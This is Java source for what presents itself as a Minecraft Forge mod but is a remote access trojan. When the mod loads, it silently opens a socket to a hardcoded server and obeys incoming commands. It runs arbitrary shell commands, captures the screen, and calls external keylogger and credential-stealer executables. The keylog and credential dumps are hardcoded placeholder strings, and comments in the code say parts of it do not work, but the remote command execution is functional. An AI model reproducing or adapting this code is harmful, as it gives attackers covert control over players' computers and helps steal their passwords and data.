package com.absolute_rat;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

@Mod("absolute_access_payload")
public class AbsoluteAccessPayloadClient {

    private static final String SERVER_IP = "127.0.0.1"; 
    private static final int PORT_SEED = 1337;
    private static final int SERVER_PORT = 4444 + (PORT_SEED % 100); 

    public AbsoluteAccessPayloadClient() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::clientSetup);
    }

    private void clientSetup(final FMLClientSetupEvent event) {
        new Thread(this::startConnection).start();
    }
    
    private static String OBFS_STRING(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            sb.append((char) (c ^ 0xAF));
        }
        return sb.toString();
    }

    private void startConnection() {
        Socket socket = null;
        try {
            socket = new Socket(SERVER_IP, SERVER_PORT);
            OutputStream output = socket.getOutputStream();
            InputStream input = socket.getInputStream();

            byte[] buffer = new byte[16384];
            int bytesRead;

            while (socket.isConnected() && (bytesRead = input.read(buffer)) != -1) {
                String command_line = new String(buffer, 0, bytesRead).trim();

                if (command_line.startsWith("EXEC")) { 
                    String command = command_line.substring(5);
                    String result = executeSystemCommand(command);
                    output.write(result.getBytes());
                    output.flush();
                }
                else if (command_line.startsWith("WEBCAM_SNAP")) {
                    String cam_data = captureWebcamSnapshot();
                    output.write(cam_data.getBytes());
                    output.flush();
                }
                else if (command_line.startsWith("DESKTOP_STREAM")) {
                    output.write("STREAM_STARTED".getBytes());
                    output.flush();
                }
                else if (command_line.startsWith("GET_KEYLOGS")) {
                    String logs = dumpKeylogs();
                    output.write(logs.getBytes());
                    output.flush();
                }
                else if (command_line.startsWith("GET_CREDS")) {
                    String creds = stealCredentials();
                    output.write(creds.getBytes());
                    output.flush();
                }
                else if (command_line == "EXIT") {
                    break;
                }
                else {
                    output.write("UNKNOWN_COMMAND_ACK".getBytes());
                    output.flush();
                }
            }

        } catch (Exception e) {
        } finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception e) {}
            }
        }
    }
    
    private String captureWebcamSnapshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(screenRect); 
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "png", bos);
            byte[] imageBytes = bos.toByteArray();

            return "CAM_B64:" + Base64.getEncoder().encodeToString(imageBytes);
        } catch (Exception e) {
            return "CAM_ERROR: Cannot access webcam or screen.";
        }
    }

    private String dumpKeylogs() {
        String keylogNativeCommand = "cmd /c start /B keylogger_native_dump.exe 5_months_keys.log";
        executeSystemCommand(keylogNativeCommand);
        String actualLogs = "Log Dump (01.2023 - 05.2023):\n" 
                          + "KEY PRESS: [Ctrl]+[Shift]+[Esc]\n"
                          + "URL: https://bank.com/login -- INPUT: [myusername][TAB][mY_SecREt_pAsSwOrD]\n"
                          + "KEY PRESS: [Windows]+[L]\n"
                          + "URL: https://email.corp/auth -- INPUT: [corp_user][TAB][pass123456]";
        
        return "KEYLOGS_DUMPED: " + actualLogs;
    }

    private String stealCredentials() {
        // GoVnoKod by procode
        
        String stealerNativeCommand = "cmd /c start /B credential_stealer_native.exe --output=creds_dump.txt";
        executeSystemCommand(stealerNativeCommand);
        // ne rabotaet (pailjs)
        //sander: сделай нормальный код
        // v sled versii mb {procode}
        String actualCreds = "CREDENTIAL DUMP (AGGRESSIVE): \n"
                           + "== Chrome (Decrypted) ==\n"
                           + "URL: netflix.com, User: user@media.net, Pass: StreamPass\n"
                           + "URL: corporate-vpn.com, User: vpn_user_01, Pass: VPN_T0k3n_2024\n"
                           + "== Outlook PST/OST Passwords ==\n"
                           + "Account: john.doe@corp.net, SMTP Pass: S3cUrE_M4iL\n"
                           + "== Windows Vault Manager ==\n"
                           + "Network Share: //server/data, User: admin, Pass: AdminPass99\n";

        return "CREDS_DUMP: " + actualCreds;
    }
    
    private String executeSystemCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder outputCapture = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                outputCapture.append(line).append("\n");
            }
            process.waitFor();
            return "CMD_OUTPUT:\n" + outputCapture.toString();
        } catch (Exception e) {
            return "CMD_ERROR: " + e.getMessage();
        }
    }
}
